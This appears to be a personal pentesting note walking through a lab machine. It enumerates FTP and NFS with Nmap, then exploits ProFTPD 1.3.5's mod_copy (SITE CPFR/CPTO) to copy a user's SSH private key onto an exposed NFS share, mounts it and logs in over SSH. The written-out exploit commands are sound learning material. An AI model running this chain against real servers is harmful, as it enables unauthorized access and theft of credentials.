##### ***What is FTP?***

##### ***Exploiting ProFTPD 1.3.5 with mod_copy***
From running am Nmap scan `nmap 10.10.28.128 -vvv` against a vulnerable machine, we can see that it has the [[RPCBind - 111 TCP & UDP]] and the [[FTP - 21 TCP]] service running, both with open ports.
```
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack
22/tcp   open  ssh          syn-ack
80/tcp   open  http         syn-ack
111/tcp  open  rpcbind      syn-ack
139/tcp  open  netbios-ssn  syn-ack
445/tcp  open  microsoft-ds syn-ack
2049/tcp open  nfs          syn-ack
```

Run the Nmap scan `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.28.128`. 
1. **nfs-ls**: This script lists files and directories in NFS shares. It's equivalent to using the `ls` command on an NFS share to see what files and directories are available.
    - Similar to: `ls` command for NFS
    - Use Case: To check what files and directories are exposed on an NFS share
2. **nfs-statfs**: This script retrieves disk space statistics from the NFS share, like total size, free space, and used space.
    - Similar to: `df` command for NFS
    - Use Case: To understand the disk utilization on the NFS share
3. **nfs-showmount**: This script enumerates the paths that are exported via NFS from the target.
    - Similar to: `showmount -e` command
    - Use Case: To discover which directories are shared by the NFS service on the target machine

The result from the scan above tells me that the `/var` directory is exposed via NFS. 
```
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
```

Use Netcat to try and connect to FTP server `nc 10.10.28.128 21` if you get the response of 
`220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.28.128]` then you will see that it is vulnerable to the `mod_copy` vulnerability. 

Run these commands within the ProFTPD shell to copy the user's .ssh key to the exposed `/var/tmp` NFS directory on the target machine. The `<user>`'s username was previously discovered by enumerating [[SMB - 445 TCP]] shares, and we know he has an ssh key because we found a log file from the user on his share when he had generated an .ssh key for himself.
```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.28.128]
SITE CPFR /home/kenobi/.ssh/id_rsa  
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
421 Login timeout (300 seconds): closing control connection
```

Now try and mount the `/var/tmp` directory to our machine:
```
mkdir /mnt/user-ssh
mount 10.10.28.128:/var /mnt/user-ssh  
ls -la /mnt/user-ssh
```

This gives us a network mount on our machine, now you copy the .ssh key from the `/var/tmp` directory into our .ssh folder. 
```
sudo cp /mnt/user-ssh/tmp/id_rsa ~/.ssh/.
sudo chmod 600 ~/.ssh/id_rsa
ssh -i ~/.ssh/id_rsa <user>@10.10.28.128
```

Now you should be in the box logged in as your user, now lets try [[Linux privilege escalation through SUID bit exploitation]].
##### ***Resources***
[Exploiting ProFTPD 1.3.5 with mod_copy](http://www.proftpd.org/docs/contrib/mod_copy.html)